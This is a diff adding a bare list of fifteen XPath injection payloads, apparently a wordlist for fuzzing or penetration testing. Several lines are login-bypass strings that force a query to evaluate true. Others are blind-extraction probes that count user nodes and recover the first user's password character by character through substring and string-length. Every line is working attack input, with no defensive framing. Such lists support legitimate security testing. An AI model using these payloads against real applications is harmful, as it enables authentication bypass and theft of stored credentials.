@@ -1,0 +1,15 @@
+' or '1'='1
+' or 1=1 or ''='
+x' or name()='username' or 'x'='y
+test' and count(/*)=1 and 'test'='test
+' or position()=1 or ''='
+admin' or '1'='1' or 'admin'='admin
+' or text()='admin' or ''='
+' or @*[contains(.,'admin')] or ''='
+' or contains(name(),'user') or ''='
+' or starts-with(name(),'admin') or ''='
+' and substring(//user[1]/password,1,1)='a
+' and string-length(//user[1]/password)>5 and ''='
+' and count(//user)>0 and ''='
+' and //user[1] and ''='
+' and boolean(//user[position()=1]) and ''='
